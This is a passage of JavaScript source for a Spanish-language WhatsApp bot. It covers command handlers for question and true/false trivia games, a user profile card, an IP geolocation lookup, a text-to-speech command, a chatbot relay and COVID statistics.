║➣ ${prefix}covid
║➣ ${prefix}clima
║➣ ${prefix}github
║➣ ${prefix}traductor
║➣ ${prefix}pinterest
║➣ ${prefix}imagen
║➣ ${prefix}google
║➣ ${prefix}wikipedia
║➣ ${prefix}playstore
║➣ ${prefix}letra
║➣ ${prefix}xd
║➣ ${prefix}perros
║➣ ${prefix}gatos
║➣ ${prefix}pato
║➣ ${prefix}wallpaper
║
╠═> DESCARGADOR
║➣ ${prefix}mediafire
║➣ ${prefix}play
║➣ ${prefix}play2
║➣ ${prefix}ytmp3
║➣ ${prefix}ytmp4
║➣ ${prefix}fbdl
║➣ ${prefix}tiktokdl
║
╠═> PASATIEMPO
║➣ ${prefix}preguntame
║➣ ${prefix}v_o_f
║➣ ${prefix}notificacion
║➣ ${prefix}tumama
║➣ ${prefix}comediante
║➣ ${prefix}consejo
║➣ ${prefix}randimg
║➣ ${prefix}djbot
╚═══════════
`
				thumbNK(fs.readFileSync('./multimedia/imagenes/quantic.jpeg'), randmenu)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'preguntame': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				var pregunta = ['¿Crees que las amistades son para siempre?', '¿Hasta qué punto llegarías por conseguir fama?', '¿Qué te frustra más no haber conseguido?', '¿Qué talento desearía tener?', '¿Cómo definirías tu tipo de sentido del humor?', '¿Qué tipo de personas son más atractivas para ti?', '¿Quién te ha influenciado más en esta vida?', '¿Con qué personaje de ficción te identificas más?', '¿Cuál ha sido tu mejor momento de tu vida?', '¿Qué es lo que echas más de menos de tu infancia?', '¿Quién es la persona más importante de tu vida?', '¿Qué tipo de música te gusta más?', 'Si te hicieras un tatuaje, ¿de qué se trataría?', '¿Qué es lo que más deseas en este mundo?', '¿Cuál es tu película favorita? ¿Por qué?', '¿Cuál es el recuerdo más vergonzoso de tu infancia?', '¿Qué comerías en tu última cena?', '¿Hay alguna prenda de ropa que no te pondrías nunca?', '¿Qué superpoder tendrías si pudieras elegir?', 'Si dominaras el mundo, ¿qué harías para cambiarlo?', '¿Tienes algún libro favorito? ¿Cuál es?', '¿Cuál sería tu trabajo soñado?', '¿Tienes algún secreto que no me hayas contado?', '¿Alguna vez te has descargado una app para ligar?', '¿Te has sentido atraído hacia una hermana (o hermano) de un amigo/a?', '¿Quieres más a tu perro (o gato) que a algún otro miembro de tu familia?', '¿Qué tipo de personas te asustan más?', '¿Qué es lo más extraño que has hecho por comer algo que te apetecía?', 'Si te gastaran una broma pesada, ¿cómo te vengarías?', '¿Cómo sería un día perfecto para ti?', 'Si pudieses saber sólo una cosa del futuro, ¿qué preguntarías?', 'Si fueras un fantasma que habita una casa encantada, ¿Cómo atraerías a la gente dentro?', '¿Qué es lo que te pone más nervioso?', '¿Cuál es el momento en el que te has sentido más sexy a lo largo de tu vida?', '¿Qué harías si te diera un ataque de risa en una situación inapropiada o en lugar del que no puedes salir?', '¿Qué es lo más vergonzoso que te han atrapado haciendo?', '¿A quién querrías ver desnudo/a y a quién odiarías ver así?', 'Si te tuvieras que poner un nombre a ti mismo, ¿cuál sería?', '¿Qué animal te gustaría ser y por qué?', '¿Qué harías si ganaras la lotería?', 'Si pudieses intercambiar tu vida con alguien, ¿con quién sería?', '¿Cómo harías reír a alguien?', '¿Qué parte de tu cuerpo te gusta más y por qué?', '¿Qué es lo más loco que has hecho por amor?', 'Si pudieras encerrar a alguien de por vida, ¿a quién sería?', '¿Qué harías si un/a desconocido/a te besara en plena calle?', '¿Cuál ha sido el sueño más extraño que has tenido nunca?', '¿En qué época te hubiese gustado vivir?', '¿Qué superpoder querrías tener?', 'Si tuvieras diez segundos para un deseo, ¿qué pedirías?', '¿Sin cuál de los cinco sentidos podrías vivir?', 'Si pudieras cenar con cualquier personaje histórico, ¿a quién elegirías?', 'Si te dijesen que eres inmortal y que ninguno de tus actos va a ser castigado, ¿qué sería lo primero que harías?', 'Si fueses capaz de cambiar algo en el mundo... ¿qué cambiarías?', 'Si pudieras viajar en el tiempo, ¿viajarías al pasado o al futuro?', '¿Qué querías ser de adulto cuando eras niño?', 'Si fueras un producto, ¿cuál sería tu nombre?', '¿Por qué crees que te pusieron tu nombre?', '¿crees que es peligroso comer halgo que cayo al suelo?', 'Si los seres humanos crecemos a partir de aprender de nuestros errores, ¿por qué tenemos miedo a fallar?', '¿Qué es lo que haces por la noche cuando no puedes dormir?', '¿Cómo crees que vas a ser como pareja?', '¿Qué crees que es lo que te impide ser completamente feliz?', '¿Qué es lo que más miedo te da?', 'Si tuvieras suficiente dinero como para que no tener que trabajar nunca, ¿en qué te dedicarías en tu tiempo libre?', '¿Cómo cambiarías el mundo si pudieras?', 'Si pudieras convertirte en famoso, ¿qué te gustaría que fuera lo que te hiciera famoso?', 'Si pudieras viajar tres años atrás en el tiempo, ¿qué consejo te darías a ti mismo?', 'Piensa en la peor cosa que te haya ocurrido en toda tu vida. ¿Qué aprendiste sobre ello?', '¿Crees que el dinero ayuda a comprar la felicidad?', '¿Cómo le explicarías la palabra “amor” a alguien sin usar la palabra “amor”?', '¿Cómo describirías un día perfecto desde que te levantas hasta que te acuestas?', '¿Qué has aprendido en tu vida que consideras que te va a ser lo más útil?', 'Si pudieras vivir en cualquier lugar del mundo, ¿dónde sería?', 'Imagina que eres el presidente y necesitas escoger a tres personas para que te ayuden: ¿cuáles serían y por qué?', 'Si pudieras hacer un regalo a cada persona del mundo pero solo pudiera ser el mismo, ¿cuál sería?', 'Si pudieras tener un solo superpoder, ¿cuál sería?', '¿Preferirías ser el jefe o un empleado?', '¿Qué preferirías: 1.000.000 € hoy mismo o 1 céntimo duplicado cada día durante 30 días?', '¿Crees que los de tu generación son realmente diferentes a cómo son las otras generaciones?', '¿Cómo crees que se acabará el mundo?', '¿Hay algo de tu cuerpo con lo que no te sientas a gusto?', '¿Qué es lo que más te motiva?', '¿Cómo de masculino o femenino te sientes?', '¿Crees que los alienígenas existen?', '¿Qué series te gusta ver?', '¿Quién es tu profesor favorito y cuál es el que peor te cae?', '¿Quién me dirías que es tu mejor amigo?', '¿Cuál crees que es la cosa más vergonzosa que ha hecho tu padre o madre?', '¿Dónde te gustaría vivir?', '¿En qué lugar transcurrirían tus vacaciones perfectas?', '¿Me puedes describir tu dormitorio?', '¿A qué personaje histórico te gustaría entrevistar?', '¿Qué tipo de ropa no llevarías puesta en ningún caso?', '¿Cuáles son tus tres bandas de música favoritas?']
				var random = pregunta[Math.floor(Math.random() * (pregunta.length))]
				reply(`*${pushname}* \n*~> _${random}_*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'v_o_f': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				var trivia = ['Ramses II es considerado el faraon con el reinado mas largo del antiguo egipto', 'Se cree que la via lactea contiene mas materia oscura que andromeda la galaxia mas grande del grupo local', 'Brasil dubuto en waterpolo en los juegos olimpicos de verano de 1932', 'Entre 1900 y 1920 el juego de la soga era un juego olimpico', 'En japon se considera mala suerte dejar que un luchador de sumo haga llorar a tu bebe', 'La cobra de cuello negro rocia veneno en los ojos de su victima para causar ceguera', 'Es imposible estornudar con los ojos abiertos', 'La persona promedio sueña solo una vez durante la noche', 'El núcleo del sujeto puede no aparecer en la frase', 'Todas las palabras esdrújulas llevan tilde', 'Las palabras graves están acentuadas en la última sílaba', 'Todas las palabras agudas llevan tilde', 'Egipto se encuentra al Noreste de África', 'Colombia limita con Ecuador, Surinam, Bolivia y Perú', 'La capital de Corea del Norte es Seúl', 'Mg2O es óxido de magnesio', 'Fe2O3 es óxido de hierro', 'NaCl es cloruro de sodio', 'O3 es oxígeno', 'CO2 es dióxido de carbono', 'El koala es un oso', 'La flor es un órgano reproductor de las plantas', 'Las arañas son insectos', 'Los líquenes son la unión simbiótica de un hongo y un alga', 'Existen animales autótrofos', 'Solo hay 2 generos para calificar a los seres humanos', 'El planeta tierra es plana', 'El humano moderno evolucionó de una especie animal anterior', 'Los antibióticos matan virus y bacterias', 'Un gen paterno es el que determina que el bebé sea niño o niña', 'El Universo se inició con una gran explosión', 'Los láseres son una emisión de ondas de sonido', 'los electrones son más pequeños que los átomos', 'La radioactividad es de origen humano', 'Los continentes llevan millones de años moviéndose y siguen moviéndose', 'El centro de la Tierra está muy caliente', 'El hipopótamo es el gran animal que más muertes causa en África', 'Comer un pescado japonés puede matarte si no está bien preparado', 'Algunos japoneses sufren una enfermedad mental al visitar París', 'Los viajes largos en avión pueden causar trombos en las piernas y la aspirina lo previene', 'Los remolinos de agua giran en sentido contrario en los dos hemisferios', 'Es imposible que las pirámides de Egipto fueran construidas por seres humanos', 'Los agujeros negros nunca mueren', 'Los planetas pueden vagar por el espacio sin una estrella madre', 'La Voyager 1 ha viajado más lejos en el espacio que cualquier objeto creado por humanos', 'El volcán más grande del sistema solar se encuentra en la Luna', 'Es muy poco frecuente que las galaxias choquen e interactúen unas con otras', 'En Venus todas las formaciones tienen nombre de mujer', 'Si se perforara tu traje espacial mientras te encuentras en el vacío del espacio, podrías sobrevivir al menos 3 o 4 minutos', 'El público general se enteró de los peligros de las sustancias radiactivas gracias a las chicas del radio', 'El satélite de Saturno Mimas también se conoce como Estrella de la muerte', 'La luna Calisto es mitad negra y mitad blanca', 'El mejor planeta para conseguir un bronceado de verdad y duradero es Mercurio', 'Los acantilados más elevados del sistema solar están precisamente en la Tierra', 'Aristarco de Samos fue la primera persona conocida que propuso el modelo heliocéntrico del sistema solar', 'La materia ordinaria es el elemento más abundante del cosmos', 'El cometa Halley no volverá a visitarnos hasta el 2041', 'Las nubes en el centro de la Vía Láctea huelen a ron saben a frambuesas y están llenas de alcohol', 'El viento solar es una corriente de partículas energéticas expulsadas por el Sol', 'Nigeria está en el hemisferio sur', 'Existen mas de 3 dimensiones en nuestro universo', 'Una división entera es aquella en la que el resto es cero', 'las plantas se reproducen', 'Todos los animales invertebrados son ovíparos', 'Las plantas elaboran su propio alimento a través de la fotosíntesis', 'SixDegrees fue la primera red social que se creó', 'El aguacate es una hortaliza', 'Instagram es la red social más usada del mundo', 'en un teclado, al lado de la letra Ñ, se encuentra la letra K', 'Marie Curie falleció de leucemia a causa de su contacto con sustancias radioactivas', 'El nitrógeno es el elemento químico más abundante en la atmósfera', 'Abraham fue quien impulsó la migración hebrea hacia Canaán', 'Miguel Indurain fue el ciclista más joven en vestir el jersey de líder en la Vuelta Ciclista a España', 'Ofelia era el amor de Hamlet', 'Los holandeses introdujeron en España los molinos de viento', 'Machu Picchu se encuentra en peru', 'El Museo del Prado es la pinacoteca más grande de España', 'Albert Einstein dijo que la cuarta guerra mundial se lucharía con piedras', 'Paul McCartney era el miembro más joven de los Beatles', 'La India fue el primer país en utilizar el papel lo hicieron cien años después de la muerte de Cristo', 'el francés es el idioma oficial de Andorra', 'Gengis Kan fue un guerrero mongol que se convirtió en emperador de China', 'Francia es el segundo país más grande de Europa', 'En el parchís tradicional se utilizan 20 fichas como máximo', 'Escocia tiene a la flor del cardo por símbolo', 'En la playa normanda de Grandville están prohibidos los elefantes', 'Un buitre chocó contra un avión a una altitud de 11.300 metros', 'Todos los insectos tienen seis patas', 'Mark Zuckerberg es daltónico El fondo de Facebook es azul porque es el color que puede distinguir mejor', 'Si tiras un céntimo desde lo alto de un rascacielos puedes atravesarle el cráneo a alguien', 'La mayoría de los seres humanos utilizamos solamente el 10% de nuestro cerebro a menudo se sugiere que mediante algunos procesos una persona puede ser capaz de aprovechar ese potencial no utilizado', 'La principal limitación de las neuronas de nuestro cerebro es que si son dañadas no tienen la posibilidad de regenerarse', 'Cuando un avión aterriza de noche se apagan todas sus luces interiores', 'Las huellas dactilares suelen estar determinadas por nuestros genes, así que pueden tener ciertas semejanzas con las de nuestros progenitores', 'Durante su vida, un hombre con una alimentación normal puede ingerir una cantidad de alimentos equivalente al peso de cien elefantes adultos', 'Nunca se ha visto a un elefante saltando en vertical', 'La Gran Muralla China es la única obra construida por el hombre visible a simple vista desde el espacio', 'En los hogares españoles hay más pájaros que gatos', 'Los esquimales utilizan 226 palabras distintas para designar la nieve según su estado', 'Una tostada con mantequilla lanzada al aire cae por el lado de la mantequilla tres de cada cuatro veces', 'Los cabellos y las uñas siguen creciendo después de la muerte', 'Cuando hace mucho frío un vasito de alcohol hace entrar en calor', 'Hay arsénico en el café', 'Francia perdió la Guerra de los Cien Años', 'Las Cícladas es un lugar real', 'Guillermo Marconi en 1943 se reafirma como el inventor de la radio por encima de Nikola Tesla', 'Las moscas macho viven en promedio 5 años', 'Los asesinos en serie tienen un coeficiente intelectual inferior a la media', 'En el año 2017 se hizo el primer trasplante de cerebro de seres humanos', 'Brasil ha sido el único país latinoamericano que ha organizado unos Juegos Olímpicos', 'Una cuarta parte de los huesos del cuerpo humano se encuentran en las manos', 'En 1694 los jueces se vistieron de negro para llorar la muerte de la reina Maria II', 'La silla eléctrica fue inventada por un dentista', 'Una libélula vive aproximadamente 48 horas', 'Al nacer tenemos 300 huesos pero de adulto solo tenemos 206', 'La jirafa es el único mamífero que no produce sonido alguno', 'No puedes puedes tocar la punta de tu nariz con la lengua', 'No puedes lamer tu codo con la lengua', 'Usas tiktok', 'La Tierra pesa alrededor de 6.588.000.000.000.000.000.000.000.000.000.000.000 toneladas', 'Los perros y los gatos no pueden ser diestros o zurdos como los humanos', '*Ella no te ama*', 'Un hombre llamado Charles Osborne tuvo hipo durante 69 años', 'Los conejillos de indias no pueden oler la menta', 'Debido a que el metal escaseaba los premios Oscar otorgados durante la Segunda Guerra Mundial eran de yeso', 'Uno de los anillos de Saturno es polvo de plata casi pura', 'Todos los cisnes de Inglaterra pertenecen a la Reina', 'La letra J es la única que no aparece en la tabla periódica', 'Hay un patrón dentro de su párpado superior que es tan único como su huella digital', 'Si un humano y un perezoso tuvieran que medir fuerzas con los brazos el perezoso ganaría sin duda', 'Todos los pandas del mundo pertenecen a China', 'Nueva York es la Gran Manzana mientras que Manhattan Kansas es la Pequeña Manzana', 'Las medusas tienen 3 corazones', 'La miel nunca se caduca Aunque pasen siglos sigue siendo comestible', 'Los toros odian el color rojo', 'Thomas Alba Edison tenía miedo a la oscuridad', 'Siglo XXI donde la contaminación ya no tiene solución', 'Cada día producimos más de un litro de saliva', 'Los delfines duermen con un ojo abierto', 'Tenemos alrededor de 100.000 pelos en la cabeza', 'La comida que cae al suelo no se contamina si se recoge antes de 5 segundos', 'Las personas tienen más probabilidades de ser contratadas si usan gafas para la entrevista', 'No hay moscas en la Antártida', 'Rusia es el país con más fumadores en el mundo', 'Neil Armstrong fue el primer humano en pisar la luna', 'El everest es la montaña mas alta del mundo', 'Una persona nunca lograra sus sueños', 'La pantalla de un móvil tiene 18 veces más bacterias que un baño público', 'Los surdos estan sordos', 'Tienes más probabilidades de que te toque la lotería que de que te caiga un rayo encima', 'En la actualidad el número de personas en el planeta tierra son 7 Mil millones aproximadamente', 'El sistema solar tiene 12 planetas', 'Los pansexuales son amantes de los panes', 'Los necrofilos son amantes del color negro', 'Hasta el siglo XIX los zapatos izquierdo y derecho eran iguales', 'Las huellas dactilares de los hijos se parecen a las de sus padres', 'El nombre completo de Picasso era\nPablo Diego José Francisco de Paula Juan Nepomuceno María de los Remedios Cipriano de la Santísima Trinidad Ruiz y Picasso', 'Las cebras son negras con rallas blancas', 'Cada año se imprime más dinero de Monopoly que dinero real en todo el mundo', 'El hombre es el animal más rápido sobre dos patas', 'El cuello de la jirafa tiene el doble de huesos que el nuestro', 'Las tortugas pueden llegar a vivir más de 500 años', 'En la cara oculta de la luna es siempre de noche', 'Hay una ciudad llamada Roma en cada continente', 'El cerebro es el órgano más pesado del cuerpo humano', 'Napoleón era bajo de estatura', 'Los Ángeles es la segunda ciudad del mundo con más mexicanos', 'la Antártida es el único continente sin serpientes', 'Los relojes con números romanos muestran el número 4 como IIII en lugar de IV', '1 La jirafa es el único mamífero que no tiene cuerdas vocales', 'El perezoso es el animal más dormilón', 'Los conejos son roedores', 'El ojo del avestruz es mas grande que su cerebro', 'segun la tabla periódica H2O es awa :v']
				var randrom = trivia[Math.floor(Math.random() * (trivia.length))]
				enviarbuton(from, `${randrom} 🤓`, `${NameBot}`, [{
					buttonId: `${prefix}vofrpt1`,
					buttonText: {
						displayText: `[ VERDADERO ]`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}vofrpt2`,
					buttonText: {
						displayText: `[ FALSO ]`,
					},
					type: 1,
				}, ])
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'vofrpt1': {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`${senderNumber} por que?`)
			}
			break
			case 'vofrpt2': {
				if (isBaneado) return
				if (isLimit(sender)) return
				reply(`${senderNumber} por que?`)
			}
			break
			case 'miperfil': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)

				//0
				axios.get('http://ip-api.com/line') //😳//
					.then(ipres => {
						let resvi = teslagod.prepareMessageFromContent(from, {
							"templateMessage": {
								"hydratedFourRowTemplate": {
									"hydratedContentText": "",
									"hydratedFooterText": "",
									"hydratedButtons": [{
										"urlButton": {
											"displayText": "Hidratest",
											"url": "google.com"
										},
										"index": 1
									}]
								},
								"hydratedTemplate": {
									"hydratedContentText": `[ INFORMACION DE LA RED DEL BOT ]\n ${ipres.data}`,
									"hydratedFooterText": `Este mensaje solo lo puedes ver tu! ;v`,
									"hydratedButtons": [{
										"urlButton": {
											"displayText": `${NameBot}`,
											"url": `${reddom}`
										},
										"index": 0
									}]
								}
							}
						}, {})
						teslagod.relayWAMessage(resvi).catch(e => {
							console.log(e)
						})
					}, error => {
						console.log(error)
					})
				// 1
				teslagod.sendMessage(from, userthumb, image, {
					thumbnail: mythumb,
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						mentionedJid: [sender]
					},
					caption: `💻 <[ PERFIL DE USUARIO]> 🌐
    
⚡ | INFO DE USUARIO |
${monospace}
➢ Número : ${senderNumber}
➢ Nombre : ${pushname}
➢ Informacion : ${desc_bio.status ? desc_bio.status : 'No hay :v'}
➢ Usuario registrado : ${isRegistro ? "[✓]" : "[X]"}
➢ Nombre de registro : ${datauser.nombre}
➢ Edad : ${datauser.edad}
➢ Fecha de registro : ${datauser.fecha}
➢ Código de registro : ${datauser.scode}
➢ Es administrador : ${isGroupAdmins ? "[✓]" : "[X]"}
➢ Solicitud desde : ${isGroup ? "Un Grupo" : "Chat privado"}
➢ Link de Número : wa.me/${senderNumber2}
${monospace}`
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 2)
			break
			case 'verip': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!UwU) return reply('*[ ! ] Introduzca una dirección IP*')
				if (!UwU.includes('19')) return reply('*[ ! ] Use una dirección IP valida de clase C!*')
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataip = await fetchJson(`https://latam-api.vercel.app/api/verip?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`[ ! ] Ocurrio un error inesperado u.u`)
					console.log(`Error fetch, comando: ${command}`)
				}
				teslagod.sendMessage(from, {
					degreesLatitude: dataip.latitud,
					degreesLongitude: dataip.longitud,
					jpegThumbnail: mylogo
				}, location, {
					quoted: null
				})
				reply(`⚡ | INFO DE DIRECCION IP |
${monospace}
➢ Dirección IP : ${dataip.ip}
➢ Dispositivo mobil : ${dataip.mobil ? "[✓]" : "[X]"}
➢ Continente : ${dataip.continente.nombre}
➢ Codigo de continente : ${dataip.continente.codigo}
➢ Pais : ${dataip.pais.nombre}
➢ Codigo de pais : ${dataip.pais.codigo}
➢ Nombre de región : ${dataip.region.nombre}
➢ Código de Region : ${dataip.region.codigo}
➢ Ciudad : ${dataip.ciudad}
➢ Distrito : ${dataip.distrito ? dataip.distrito : 'No encontrado u.u'}
➢ Codigo postal : ${dataip.ZIP ? dataip.ZIP : 'No encontrado u.u'}
➢ Latitud : ${dataip.latitud}
➢ Longitud : ${dataip.longitud}
➢ Zona horaria : ${dataip.zonaHoraria}
➢ Offset : ${dataip.offset}
➢ Moneda local : ${dataip.divisa}
➢ Proveedor de internet : ${dataip.isp}
➢ Organización : ${dataip.organizacion}
➢ Sociedad : ${dataip.as} 
➢ DNS : ${dataip.reverse ? dataip.reverse : 'No encontrado u.u'}
➢ Servidor proxy : ${dataip.proxy ? "[✓]" : "[X]"}
➢ Alojamiento web : ${dataip.hosting ? "[✓]" : "[X]"}
${monospace}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'grupos':
			case 'gruposwa':
			case 'wagrupos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/gpwa?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				await teslagod.sendMessage(from, TeslApi.enlaces + `\nᴺᴼᵀᴬ" ˢᶦ ᵉⁿ ᵉˢᵗᵉ ᵍʳᵘᵖᵒ ᵉˢᵗᵃ́ ᵖʳᵒʰᶦᵇᶦᵈᵒ ᶜᵒᵐᵖᵃʳᵗᶦʳ ˡᶦⁿᵏˢ• ˡᵒˢ ᵃᵈᵐᶦⁿᶦˢᵗʳᵃᵈᵒʳᵉˢ ᵗᶦᵉⁿᵉⁿ ᵗᵒᵈᵒ ᵉˡ ᵈᵉʳᵉᶜʰᵒ ᵃ ᵉˡᶦᵐᶦⁿᵃʳ ᵃˡ ᵇᵒᵗ ⁻`, text, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} Quieres agregar tu grupo :D?`,
							body: 'Toca aqui ;3',
							sourceUrl: 'https://api.whatsapp.com/send?phone=51995386439&text=Wenasss!%0ADeseo%20agregar%20mi%20grupo%20al%20comando%20del%20bot%0AAsunto%20del%20grupo%3A%20%0ALink%3A%20',
							thumbnail: userthumb
						}
					},
					sendEphemeral: true
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'vos':
			case 'voz': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (args.length < 1) return enviarbuton(from, `*[ ! ] Despues de usar el comando ${command}, tiene que agregar el prefijo del idioma en el cual desea escuchar el audio*`, `Ejemplo de uso:\n\n${prefix + command} es hola\n-> es = prefijo español\n--> hola = texto\n\n${cocreador} ✓`, [{
					buttonId: `<${sender}/>`,
					buttonText: {
						displayText: `Idiomas disponibles : ${nwn}\n
  'af': 'Africano',
  'sq': 'Albanes',
  'ar': 'Arabico',
  'hy': 'Armenio',
  'ca': 'Catalan',
  'zh': 'Chino',
  'zh-cn': 'Chino (Mandarin/China)',
  'zh-tw': 'Chino (Mandarin/Taiwanes)',
  'zh-yue': 'Chino (Cantones)',
  'hr': 'Croata',
  'cs': 'Checo',
  'da': 'Danes',
  'nl': 'Holandes',
  'en': 'Ingles',
  'en-au': 'Ingles (Australia)',
  'en-uk': 'Ingles (Reino unido)',
  'en-us': 'Ingles (Estados unidos)',
  'eo': 'Esperanto',
  'fi': 'Finlandes',
  'fr': 'Frances',
  'de': 'Aleman',
  'el': 'Griego',
  'ht': 'Criollo haitiano',
  'hi': 'Hindio',
  'hu': 'Hungaro',
  'is': 'islandes',
  'id': 'Indonesio',
  'it': 'Italiano',
  'ja': 'Japones',
  'ko': 'Koreano',
  'la': 'Latino',
  'lv': 'Leton',
  'mk': 'Macedonio',
  'no': 'Noruego',
  'pl': 'Polaco',
  'pt': 'Portugues',
  'pt-br': 'Portugues (Brazil)',
  'ro': 'Rumano',
  'ru': 'Ruso',
  'sr': 'Serbio',
  'sk': 'Slovaco',
  'es': 'Español',
  'es-es': 'Español (España)',
  'es-us': 'Español (Estados Unidos)',
  'sw': 'Swahili',
  'sv': 'Sueco',
  'ta': 'Tamil',
  'th': 'Tailandes',
  'tr': 'Turco',
  'vi': 'Vietnamita',
  'cy': 'Gales'`,
					},
					type: 1,
				}, ])

				const gtts = require('./libreria/gtts')(args[0])
				if (args.length < 2) return reply(`*[ ! ] Y el texto?*`)
				dtt = body.slice(8)
				ranm = getRandom('.mp3')
				rano = getRandom('.ogg')
				dtt.length > 600 ?
					reply(`Maximo de caracteres 600!`) :
					gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							procesando(`_Procesando, ${pushname} por favor espere..._`)
							teslagod.updatePresence(from, Presence.recording)
							buff = fs.readFileSync(rano)
							if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
							teslagod.sendMessage(from, buff, audio, {
								mimetype: 'audio/mp4',
								duration: -707,
								ptt: true,
								quoted: fakemek,
								contextInfo: {
									mentionedJid: [sender],
									externalAdReply: {
										title: `${NameBot} 🗣️`,
										"body": `${dtt}`,
										"previewType": "PHOTO",
										"thumbnail": userthumb,
										"sourceUrl": `${reddom}`
									}
								}
							})
							fs.unlinkSync(rano)
						})
					})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'simi':
			case 'bot': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (isSimi) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (args.length < 1) return reply(`*[ ! ] Y el texto?*`)
				let chatuser = UwU
				try {
					apichat = await fetchJson(`https://latam-api.vercel.app/api/simisimi?apikey=${MyApiKey}&idioma=es&chat=${chatuser}`)
				} catch (e) {
					reply(`C muere*`)
				}
				let chatsimi = apichat.respuesta
				await teslagod.sendMessage(from, chatsimi, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `${MyInfo.NombreDelBot} : ${pushname}`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/SimichatHd.jpg')
							}
						}
					}
				}).catch(e => {
					console.log(e)
					reply(`Sin respuesta!`)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'covid':
			case 'covid19':
			case 'coronavirus':
			case 'coronaviruz': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/covid19?apikey=${MyApiKey}&q=${UwU ? UwU : "world"}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": fs.readFileSync('./multimedia/imagenes/MultiHD.jpg')
				}
				teslagod.sendMessage(from, {
					"contentText": `${monospace}[ COVID-19 ]${monospace}

🌁 Lugar: ${UwU ? UwU : "Mundo"}
🫁 Casos positivos: ${TeslApi.casos}
🤧 Casos de hoy: ${TeslApi.casosDehoy}
💀 Fallecidos: ${TeslApi.muertes}
⚰️ Fallecidos de hoy: ${TeslApi.muertesDehoy}
🤒 Recuperados: ${TeslApi.recuperados}
😷 En recuperacion: ${TeslApi.activo}
😵 Casos criticos: ${TeslApi.critico}
🫂 Casos por millon: ${TeslApi.casosPorMillon}
☠️ Fallecidos por millon: ${TeslApi.muertesPorMillon}
